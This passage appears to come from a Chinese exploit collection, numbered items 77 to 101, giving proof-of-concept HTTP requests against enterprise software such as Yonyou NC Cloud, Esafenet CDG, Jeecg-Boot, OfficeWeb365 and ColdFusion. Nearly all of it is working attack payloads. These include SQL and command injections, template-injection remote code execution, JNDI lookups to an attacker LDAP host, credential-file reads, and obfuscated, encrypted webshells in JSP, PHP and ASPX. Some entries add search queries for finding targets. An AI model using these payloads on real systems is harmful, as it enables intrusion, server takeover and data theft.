13 Referer: http://192.168.24.3:6868/settings/system/user.php?m1=7&m2=0
14
15 {"change_white_list_cmd":{"ip":"{BD435CCE-3F91EC}","name":"3AF264D9-
16 AE5A","id":"111;set//global//general_log=on;","type":"0"}}
设置⽇志php⽂件
1 POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1
2 Host: 192.168.24.3:6868
3 Content-Length: 195
4 Accept: */*
5 X-Requested-With: XMLHttpRequest
6 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 
(KHTML,
7 like Gecko) Chrome/114.0.0.0 Safari/537.36
8 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
9 Origin: http://192.168.24.3:6868
10 Referer: http://192.168.24.3:6868/
11 Accept-Encoding: gzip, deflate
12 Accept-Language: zh-CN,zh;q=0.9
13 Cookie: SKYLARa0aedxe9e785feabxae789c6e03d=tf2xbucirlmkuqsxpg4bqaq0snb7
14 Connection: close
15
16 {"change_white_list_cmd":{"ip":"{BD435CCE-3F91EC}","name":"3AF264D9-
17 AE5A","id":"111;set//global//general_log_file=0x2e2e2f2e2e2f436f6e736f6c652f636
8656
18 36b5f6c6f67696e322e706870;","type":"0"}}
写⼊php代码
1 POST /inter/ajax.php?cmd=settings_distribute_cmd HTTP/1.1
2 Host: 192.168.24.3:6868
3 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) 
Gecko/20100101
4 Firefox/114.0
5 Accept: */*6 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
7 Accept-Encoding: gzip, deflate
8 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
9 X-Requested-With: XMLHttpRequest
10 Content-Length: 222
11 Origin: http://192.168.24.3:6868
12 Connection: close
13 Referer: http://192.168.24.3:6868/index.php
14
15 {"settings_distribute_cmd":{"userSession":"{BD435CCE-3F91-E1AA-3844-
16 76A49EE862EB}","mode_id":"3AF264D9-AE5A-86F0-6882-
DD7F56827017","settings":"3AF264D9-
17 AE5A-86F0-6882-DD7F56827017_0","SC_list":{"a":"<?php phpinfo();?>"}}}
最后get请求rce：
1 http://192.168.24.3:6868/check_login2.php
77. Panabit iXCache⽹关RCE漏洞CVE-2023-38646
1 POST /cgi-bin/Maintain/date_config HTTP/1.1
2 Host: 127.0.0.1:8443
3 Cookie: pauser_9667402_260=paonline_admin_44432_9663; pauser_9661348_661=paonlin
4 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 F
5 Content-Type: application/x-www-form-urlencoded
6 Content-Length: 107
7
8 ntpserver=0.0.0.0%3Bwhoami&year=2000&month=08&day=15&hour=11&minute=34&second=53
78. ⾦和OA C6-GetSgIData.aspx SQL注⼊漏洞
🌅 POST /c6/Contro/GetSglData.aspx/.ashx
Host: ip.portUser-Agent: Mozillal5.0 (Windows NT 5.1) AppleWebkit/537.36(KHTML， like Gecko)
Chrome/35.0.2117.157 Safari/537 36
Connection: close
Content-Length.189
Content-Type. text/plain
Accept-Encoding: gzip
exec master..xp cmdshell 'ipconfig'
79. 致远OA任意管理员登录
⚽ POST /seeyon/thirdpartyController.do HTTP/1.1
method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjg
zODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.180. ⽤友nc-cloud RCE
👍 漏洞影响
NC63、NC633、NC65
NC Cloud1903、NC Cloud1909
NC Cloud2005、NC Cloud2105、NC Cloud2111YonBIP⾼级版2207
先发送数据包，返回200
POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host: 127.0.0.1:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/
apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: cookiets=168170496; JSESSIONID=33A343770FF.server
If-None-Match: W/"1571-1589211696000"
If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 249
{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","para
meterTypes":["java.lang.Object","java.lang.String"],"parameters":
["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapp
s/nc_web/404.jsp"]}
再发送数据包执⾏命令，返回命令执⾏结果
POST /404.jsp?error=bsh.Interpreter HTTP/1.1
Host: 127.0.0.1:8080
Cache-Control: max-age=0Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/
apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: cookiets=1681785232226; JSESSIONID=334D3ED07A343770FF.server
If-None-Match: W/"1571-1589211696000"
If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ping
8.8.8.8").getInputStream())
81. ⽤友 NC Cloud jsinvoke 任意⽂件上传漏洞
漏洞描述
⽤友 NC Cloud jsinvoke 接⼝存在任意⽂件上传漏洞，攻击者通过漏洞可以上传任意⽂件⾄服务器中，
获取系统权限
app="⽤友-NC-Cloud"
POST /uapjs/jsinvoke/?action=invoke
Content-Type: application/json
{
"serviceName": "nc.itf.iufo.IBaseSPService",
"methodName": "saveXStreamConfig",
"parameterTypes": [
"java.lang.Object","java.lang.String"
],
"parameters": [
"${param.getClass().forName(param.error).newInstance().eval(param.cmd)}",
"webapps/nc_web/407.jsp"
]
}
POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host:
Connection: Keep-Alive
Content-Length: 253
Content-Type: application/x-www-form-urlencoded
{
"serviceName": "nc.itf.iufo.IBaseSPService",
"methodName": "saveXStreamConfig",
"parameterTypes": [
"java.lang.Object",
"java.lang.String"
],
"parameters": [
"${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://VPSip:1389/
TomcatBypass/TomcatEcho')}",
"webapps/nc_web/301.jsp"
]
}
82. 亿赛通 /UploadFileFromClientServiceForClient 任意⽂件上传漏
洞漏洞描述:亿赛通电⼦⽂档安全管理系统（简称：CDG）是⼀款电⼦⽂档安全防护软件。亿赛通电⼦⽂
档安全管理系统任意⽂件上传
漏洞危害:攻击者可以上传恶意⽂件，获得服务器权限
影响版本： v5.6.1.97.110（ 最新版） 受影响， 其他⽼版本暂⽆环境验证， 可能受影响
修复⽅法
官⽹已发布安全修复版本，请升级⾄官⽹最新版本
https://www.esafenet.com/
1 POST /CDGServer3/UploadFileFromClientServiceForClient?AHECJIIACHMDAPKFAPLPFJPJHA
2 Accept: text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*
3 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
4 Accept-Encoding: gzip, deflate
5 Accept-Language: zh-CN,zh;q=0.8
6 Content-Length: 1782
7 Content-Type: application/xml;charset=UTF-8
8 Cookie: JSESSIONID=A00E152C6F1163D70C172BDCF32D9880
9 Cache-Control: no-cache
10 Pragma: no-cache
11 Host: 192.168.80.9:8443
12 Connection: close
13
14 Hello Administrator
15 WelCome To Java Console!<%@page import="sun.misc.*,javax.crypto.Cipher,javax.cr
16 <%!
17 class tas9er0s extends \u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u00
18 tas9er0s(\u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 t
19 super(tas9er9V);
20 }
21 public Class tas9er33(byte[] tas9er0x) {
22 return super.d\uuuuuuuuu0065fineClass(tas9er0x,0,tas9er0x.length);
23 }
24 }
25 %><%
26 out.println("Random Garbage Data:");
27 Random tas9erUi = new Random();
28 int tas9erk1 = tas9erUi.nextInt(1234);
29 int tas9erQ5 = tas9erUi.nextInt(5678);
30 int tas9er4l = tas9erUi.nextInt(1357);
31 int tas9er13 = tas9erUi.nextInt(2468);
32 out.println(tas9erk1+","+tas9erQ5+","+tas9er4l+","+tas9er13);
33 String[] tas9erlq = new String[]{"A", "P", "B", "O", "C", "S", "D", "T"};
34 String tas9er08 = tas9erlq[1] + tas9erlq[3] + tas9erlq[5] + tas9erlq[7];
35 if (request.getMethod().equals(tas9er08)) {
36 String tas9erua = new String(new B\u0041\u0053\u0045\u0036\u0034\u0044\u37 session.setAttribute("u", tas9erua);
38 Cipher tas9er5L = Cipher.getInstance("AES");
39 tas9er5L.init(((tas9erk1 * tas9erQ5 + tas9er4l - tas9er13) * 0) + 3 - 1,
40 new tas9er0s(this.\u0067\u0065t\u0043\u006c\u0061\u0073\u0073().\u0067\u
41 }
42 %>
1 shell
2 https://192.168.80.9:8443/CDGServer3/favicat.jsp
83. Jeecg-Boot Freemarker 模版注⼊漏洞
漏洞危害
1、如果被攻击者利⽤，可直接getshell；
2、如果被攻击者利⽤，可被⽤于内⽹信息收集，扫描⽬标内⽹主机；
3、如果被攻击者利⽤，可攻击运⾏在内⽹或本地的应⽤程序；
4、如果被攻击者利⽤，可被⽤作攻击跳板；
修复⽅法
Jeecg官⽅暂未修复该漏洞，⽆法通过升级JeecgBoot版本修复该漏洞，建议：
1、临时禁⽤Freemarker⾼危的代码执⾏类，如：freemarker.template.utility.Execute（ftl利⽤⽅式
较多，请⾃⾏判断）
1
2 POST /jeecg-boot/jmreport/qurestSql HTTP/1.1
3 Host: xxx.com
4 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (
5 Accept-Encoding: gzip, deflate
6 Accept: /
7 Connection: close
8 Content-Type: application/json;charset=UTF-8
9 Content-Length: 129
10
11 {"apiSelectId":"1290104038414721025",
12 "id":"11 POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1 
2 Host: 192.168.90.1:3100 
3 Origin: http://192.168.90.1:3100 
4 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 
(KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 
5 Accept: */* 
6 Accept-Encoding: gzip, deflate 
7 Accept-Language: zh-CN,zh;q=0.9 
8 Connection: close 
9 Content-Type: application/json 
10 Content-Length: 123 
11
12 {"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?
new()> ${ ex(\"open -a calculator.app \") }' "} 
84. 远秋医学技能考试系统SQL注⼊
1 sqlmap -u "http://xxx.xxx.xxx.xxx/NewsDetailPage.aspx?key=news&id=7" -p id -batc85. 新开普智慧校园系统代码执⾏漏洞
漏洞详情
新开普智慧校园系统/service_transport/service.action接⼝处存在FreeMarker模板注⼊，攻击者可在
未经⾝份认证的情况下，调⽤后台接⼝，构造恶意代码实现远程代码执⾏，最终可造成服务器失陷。
路径存在则漏洞存在
http://xxx.com/service_transport/service.action纯⽂本
poc没回显
1 POST /service_transport/service.action HTTP/1.1
2 Host: your-ip
3 Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*
;q=0.8
4 Accept-Encoding: gzip, deflate
5 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
6 Cookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4
7 Upgrade-Insecure-Requests: 1
8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 
Firefox/114.0
9
10 {
11 "command": "GetFZinfo", 
12 "UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"?
new()>${ex(\"cmd /c ping v0u26h.ceye.io\")}"
13 }
纯⽂本
写⽂件
1 POST /service_transport/service.action HTTP/1.1
2 Host: your-ip
3 Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*
;q=0.8
4 Accept-Encoding: gzip, deflate
5 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
6 Cookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4
7 Upgrade-Insecure-Requests: 1
8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 
Firefox/114.0
9
10 {
11 "command": "GetFZinfo", 
12 "UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"?
new()>${ex(\"cmd /c echo PCUhCiAgICBjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXIgewogICAgICAgIFUoQ2xhc3NMb2FkZXI
gYykgewogICAgICAgICAgICBzdXBlcihjKTsKICAgICAgICB9CiAgICAgICAgcHVibGljIENsYXNzIG
coYnl0ZVtdIGIpIHsKICAgICAgICAgICAgcmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsIDAsIGIub
GVuZ3RoKTsKICAgICAgICB9CiAgICB9CiAKICAgIHB1YmxpYyBieXRlW10gYmFzZTY0RGVjb2RlKFN0
cmluZyBzdHIpIHRocm93cyBFeGNlcHRpb24gewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIENsYXN
zIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RGVjb2RlciIpOwogICAgICAgIC
AgICByZXR1cm4gKGJ5dGVbXSkgY2xhenouZ2V0TWV0aG9kKCJkZWNvZGVCdWZmZXIiLCBTdHJpbmcuY
2xhc3MpLmludm9rZShjbGF6ei5uZXdJbnN0YW5jZSgpLCBzdHIpOwogICAgICAgIH0gY2F0Y2ggKEV4
Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgIENsYXNzIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgiamF2YS5
1dGlsLkJhc2U2NCIpOwogICAgICAgICAgICBPYmplY3QgZGVjb2RlciA9IGNsYXp6LmdldE1ldGhvZC
giZ2V0RGVjb2RlciIpLmludm9rZShudWxsKTsKICAgICAgICAgICAgcmV0dXJuIChieXRlW10pIGRlY
29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZSIsIFN0cmluZy5jbGFzcykuaW52b2tlKGRl
Y29kZXIsIHN0cik7CiAgICAgICAgfQogICAgfQolPgo8JQogICAgU3RyaW5nIGNscyA9IHJlcXVlc3Q
uZ2V0UGFyYW1ldGVyKCJwYXNzd2QiKTsKICAgIGlmIChjbHMgIT0gbnVsbCkgewogICAgICAgIG5ldy
BVKHRoaXMuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKS5nKGJhc2U2NERlY29kZShjbHMpKS5uZ
XdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7CiAgICB9CiU+ 
>./webapps/ROOT/1.txt\")}"
>13 }
>纯⽂本
>⽂件转换为jsp
>1 POST /service_transport/service.action HTTP/1.1
>2 Host: your-ip
>3 Accept:
>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*
>;q=0.8
>4 Accept-Encoding: gzip, deflate
>5 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
>6 Cookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4
>7 Upgrade-Insecure-Requests: 1
>8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 
>Firefox/114.0
>9
>10 {
>11 "command": "GetFZinfo", 
>12 "UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"?
>new()>${ex(\"cmd /c certutil -decode ./webapps/ROOT/1.txt 
>./webapps/ROOT/1.jsp\")}"
>13 }
86. 拓尔思 MAS 任意⽂件上传漏洞87. ⾦⼭终端安全系统V9任意⽂件上传漏洞
1 POST /inter/software_relation.php HTTP/1.1
2 Host: 192.168.249.137:6868
3 Content-Length: 1557
4 Pragma: no-cache 
5 Cache-Control: no-cache 
6 Upgrade-Insecure-Requests: 1
7 Origin: http://192.168.249.137:6868
8 Content-Type: multipart/form-data; boundary=----
WebKitFormBoundaryxRP5VjBKdqBrCixM 
9 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
10 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,ima
ge/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
11 Accept-Encoding: gzip, deflate 
12 Accept-Language: zh-CN,zh;q=0.9
13 Connection: close ------WebKitFormBoundaryxRP5VjBKdqBrCixM 
14 Content-Disposition: form-data; name="toolFileName" ../../datav.php ------
WebKitFormBoundaryxRP5VjBKdqBrCixM 
15 Content-Disposition: form-data; name="toolDescri" ------
WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name="id" --
----WebKitFormBoundaryxRP5VjBKdqBrCixM 
16 Content-Disposition: form-data; name="version" ------
WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data;
name="sofe_typeof" ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content￾Disposition: form-data; name="fileSize" ------
WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name="param"------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data;
name="toolName" ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition:
form-data; name="toolImage"; filename="3.php" Content-Type: image/png <?php 
@error_reporting(0); session_start(); $key="e45e329feb5d925b"; //rebeyond 
$_SESSION['k']=$key; session_write_close(); 
$post=file_get_contents("php://input"); if(!extension_loaded('openssl')) { 
$t="base64_"."decode"; $post=$t($post.""); for($i=0;$i<strlen($post);$i++) { 
$post[$i] = $post[$i]^$key[$i+1&15]; } } else { $post=openssl_decrypt($post, 
"AES128", $key); } $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; 
class C{public function __invoke($p) {eval($p."");}} @call_user_func(new 
C(),$params); ?> ------WebKitFormBoundaryxRP5VjBKdqBrCixM
88. Eramba任意代码执⾏漏洞
影响版本：Enterprise and Community edition <= 3.19.1
1 GET /settings/download-test-pdf?path=ip%20a; HTTP/1.1
2 Host: [redacted]
3 Cookie: translation=1; csrfToken=1l2rXXwj1D1hVyVRH%2B1g%2BzIzYTA3OGFiNWRjZWVmODQ
4 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111
5 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
6 Accept-Language: de,en-US;q=0.7,en;q=0.3
7 Accept-Encoding: gzip, deflate
8 Referer: https://[redacted]/settings
9 Upgrade-Insecure-Requests: 1
10 Sec-Fetch-Dest: document
11 Sec-Fetch-Mode: navigate
12 Sec-Fetch-Site: same-origin
13 Sec-Fetch-User: ?1
14 Te: trailers
15 Connection: close
16
17 HTTP/1.1 500 Internal Server Error
18 Date: Fri, 31 Mar 2023 12:37:55 GMT
19 Server: Apache/2.4.41 (Ubuntu)
20 Access-Control-Allow-Origin: *
21 Expires: Thu, 19 Nov 1981 08:52:00 GMT
22 Cache-Control: no-store, no-cache, must-revalidate
23 Pragma: no-cache
24 Content-Disposition: attachment; filename="test.pdf"
25 X-DEBUGKIT-ID: d383f6d4-6680-4db0-b574-fe789abc1718
26 Connection: close
27 Content-Type: text/html; charset=UTF-8
28 Content-Length: 203346929
30 <!DOCTYPE html>
31 <html>
32 <head>
33 <meta charset="utf-8"/> <meta name="viewport" content="width=device-width, initi
34 <title>
35 Error: The exit status code '127' says something went wrong:
36 stderr: &quot;sh: 1: --dpi: not found
37 &quot;
38 stdout: &quot;1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state 
39 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
40 inet 127.0.0.1/8 scope host lo
41 valid_lft forever preferred_lft forever
42 inet6 ::1/128 scope host
43 valid_lft forever preferred_lft forever
44 2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state 
45 link/ether [redacted] brd ff:ff:ff:ff:ff:ff
46 inet [redacted] brd [redacted] scope global ens33
47 valid_lft forever preferred_lft forever
48 inet6 [redacted] scope link
49 valid_lft forever preferred_lft forever
50 &quot;
51 command: ip a; --dpi '90' --lowquality --margin-bottom '0' --margin-left '0'
52 --margin-right '0' --margin-top '0' --orientation 'Landscape'
53 --javascript-delay '1000' '/tmp/knp_snappy6426d4231040e1.91046751.html'
54 '/tmp/knp_snappy6426d423104587.46971034.pdf'. </title>
55
56 [...]
漏洞复现：https://mp.weixin.qq.com/s/n5RGBu8mBmN1UwZAnM99GA
89. Adobe ColdFusion 反序列化漏洞CVE-2023-29300
1 POST /CFIDE/adminapi/base.cfc?method= HTTP/1.1
2 Host: 1.2.3.4:1234
3 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15
4 Content-Length: 400
5 Content-Type: application/x-www-form-urlencoded
6 Accept-Encoding: gzip
7 cmd: id
8
9 argumentCollection=10 <wddxPacket version='1.0'>
11 <header/>
12 <data>
13 <struct type='xcom.sun.rowset.JdbcRowSetImplx'>
14 <var name='dataSourceName'>
15 <string>ldap://xxx.xxx.xxx:1234/Basic/TomcatEcho</string>
16 </var>
17 <var name='autoCommit'>
18 <boolean value='true'/>
19 </var>
20 </struct>
21 </data>
22 </wddxPacket>90. 1Panel loadfile 后台⽂件读取漏洞
漏洞描述
1Panel后台存在任意⽂件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息⽂件
POC
POST /api/v1/file/loadfile {"paht":"/etc/passwd"}
漏洞复现
登陆⻚⾯
91. ⾦蝶云星空 CommonFileserver 任意⽂件读取漏洞
1 GET /CommonFileServer/c:/windows/win.ini
92. CODING平台idna⽬录存在⽬录遍历漏洞
Coding.net 是⼀个⾯向开发者的云端开发平台，提供 Git/SVN 代码托管、任务管理，在idna存在⽬录
泄露漏洞，攻击者可获取⽬录⽂件信息。
检索条件: title="⼀站式软件研发管理平台"
poc:
1 relative: req0
2 session: false
3 requests:
4 - method: GET
5 timeout: 10
6 path: /ci/pypi/simple/idna/
7 headers:
8 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML
9 like Gecko) Chrome/69.0.2786.81 Safari/537.36
10 follow_redirects: true11 matches: (code.eq("200") && body.contains("Index of"))
93. 中远麒麟堡垒机 admin.php SQL注⼊
麒麟堡垒机⽤于运维管理的认证、授权、审计等监控管理。中远麒麟堡垒机存在SQL注⼊，可利⽤该
漏洞获取系统敏感信息。
检索条件:
cert="Baolei"||title="麒麟堡垒机"||body="admin.php?
controller=admin_index&action=get_user_login_fristauth"||body="admin.php?
controller=admin_index&action=login"
poc:
relative: req0 && req1
session: false
requests:
- method: POST
timeout: 10
path: /admin.php?controller=admin_commonuser
headers:
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/69.0.2786.81 Safari/537.36
data: username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND
'AAdm'='AAdm
follow_redirects: true
matches: (code.eq("200") && time.gt("5") && time.lt("10"))
- method: POST
timeout: 10
path: /admin.php?controller=admin_commonuser
headers:
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/69.0.2786.81 Safari/537.36
Content-Type: application/x-www-form-urlencoded
data: username=admin
follow_redirects: true
matches: time.lt("5")
94. ⽤友NC存在JNDI注⼊漏洞
待补充。95. OfficeWeb365 远程代码执⾏漏洞
360漏洞云监测到⽹传《OfficeWeb365远程代码执⾏漏洞》的消息，经漏洞云复核，确认为【真实】
漏洞，漏洞影响【未知】版本，该漏洞标准化POC已经升级漏洞云情报平台，平台编号： 360LDYLD-
2023-00002453
1 POST /PW/SaveDraw?path=../../Content/img&idx=1.aspx HTTP/1.1
2 Host:xxx
3 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 
(KHTML, like Gecko) Chrome/88.0.434.18 Safari/537.36
4 Content-Length: 2265
5 Content-Type: application/x-www-form-urlencoded
6 Accept-Encoding: gzip, deflate
7 Connection: close
8
9 data:image/png;base64,01s34567890123456789y12345678901234567m91<%@ Page 
Language="C#" %>
10 <%@Import Namespace="System.Reflection" %>
11 <script runat="server">
12
13 private byte[] Decrypt(byte[] data)
14 {
15 string key="e45e329feb5d925b";
16 data = 
Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(data));
17 System.Security.Cryptography.RijndaelManaged aes = new
System.Security.Cryptography.RijndaelManaged();
18 aes.Mode = System.Security.Cryptography.CipherMode.ECB;
19 aes.Key = Encoding.UTF8.GetBytes(key);
20 aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
21 return aes.CreateDecryptor().TransformFinalBlock(data, 0, 
data.Length);
22 }
23 private byte[] Encrypt(byte[] data)
24 {
25 string key = "e45e329feb5d925b";
26 System.Security.Cryptography.RijndaelManaged aes = new
System.Security.Cryptography.RijndaelManaged();
27 aes.Mode = System.Security.Cryptography.CipherMode.ECB;
28 aes.Key = Encoding.UTF8.GetBytes(key);
29 aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
30 return
System.Text.Encoding.UTF8.GetBytes(Convert.ToBase64String(aes.CreateEncryptor()
.TransformFinalBlock(data, 0, data.Length)));31 }
32
33
34 </script>
35 <%
36 //byte[] 
c=Request.BinaryRead(Request.ContentLength);Assembly.Load(Decrypt(c)).CreateIns
tance("U").Equals(this);
37 byte[] c=Request.BinaryRead(Request.ContentLength);
38 string asname=System.Text.Encoding.ASCII.GetString(new
byte[] 
{0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x65,0x66,0x6c,0x65,0x63,0x74,0x69,0x6
f,0x6e,0x2e,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79});
39 Type assembly=Type.GetType(asname);
40 MethodInfo load = 
assembly.GetMethod("Load",new Type[] {new byte[0].GetType()});
41 object obj=load.Invoke(null, new object[]
{Decrypt(c)});
42 MethodInfo create = 
assembly.GetMethod("CreateInstance",new Type[] { "".GetType()});
43 string name = 
System.Text.Encoding.ASCII.GetString(new byte[] { 0x55 });
44 object pay=create.Invoke(obj,new object[] { 
name });
45 pay.Equals(this);%>>---
46
96. gitlab路径遍历读取任意⽂件漏洞
可能需要登录
1 GET /group1/group2/group3/group4/group5/group6/group7/group8/group9/project9/upl
97. Hytec Inter HWL-2511-SS popen.cgi命令注⼊漏洞
1 title="index" && header="lighttpd/1.4.30"
2
3 /cgi-bin/popen.cgi?command=ping%20-
c%204%201.1.1.1;cat%20/etc/shadow&v=0.130303344313792198. 傲盾信息安全管理系统前台远程命令执⾏漏洞
漏洞描述：信息安全管理系统（ISMS）是IDC/ISP业务经营者建设的具有基础数据管理、 访问⽇志管
理、信息安全管理等功能的信息安全管理系统，该漏洞可未授权的情况下直接执⾏任意命令
1 相关信息：
2 /user_management/sichuan_login
3 请求体：
4 loginname=sysadmin&ticket=
99. 蓝凌EKP系统存在未授权访问漏洞
漏洞描述：蓝凌EKP由深圳市蓝凌软件股份有限公司⾃出研发，是⼀款全程在线数字化OA，应⽤于⼤
中型企业在线化办公。 包含流程管理、知识管理、会议管理、公⽂管理、任务管理及督办管理等100
个功能模块。。攻击者可利⽤漏洞获取⼤量敏感信息。
检索语法：
1 Condition: body="蓝凌云服务平台"||(body="Landray"&&body="登录系统")||body="/scrip
2 ||(body="StylePath" && body="encryptPassword")
Poc:
1 relative: req0
2 session: false
3 requests:
4 - method: GET
5 timeout: 10
6 path: /./ui-ext/./behavior/
7 headers:
8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/53
9 (KHTML, like Gecko) Chrome/84.0.850.132 Safari/537.36
10 follow_redirects: false
11 matches: (code.eq("200") && body.contains("ekp_server.log"))100. 中远麒麟堡垒机tokens SQL注⼊
检索语法：
1 cert="Baolei"||title="麒麟堡垒机"||body="admin.php?controller=admin_index&action=
Poc:
1 relative: req0 && req1
2 session: false
3 requests:
4 - method: POST
5 timeout: 10
6 path: /baoleiji/api/tokens
7 headers:
8 Content-Type: application/x-www-form-urlencoded
9 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, lik
10 Gecko) Chrome/89.0.3119.54 Safari/537.36
11 data: constr=1' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AA
12 follow_redirects: true
13 matches: (time.gt("5") && time.lt("10"))
14 - method: POST
15 timeout: 10
16 path: /baoleiji/api/tokens
17 headers:
18 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, lik
19 Gecko) Chrome/89.0.3119.54 Safari/537.36
20 Content-Type: application/x-www-form-urlencoded
21 data: constr=1&title=%40127.0.0.1
22 follow_redirects: true
23 matches: time.lt("5")
101. 明源ERP存在SQL时间盲注
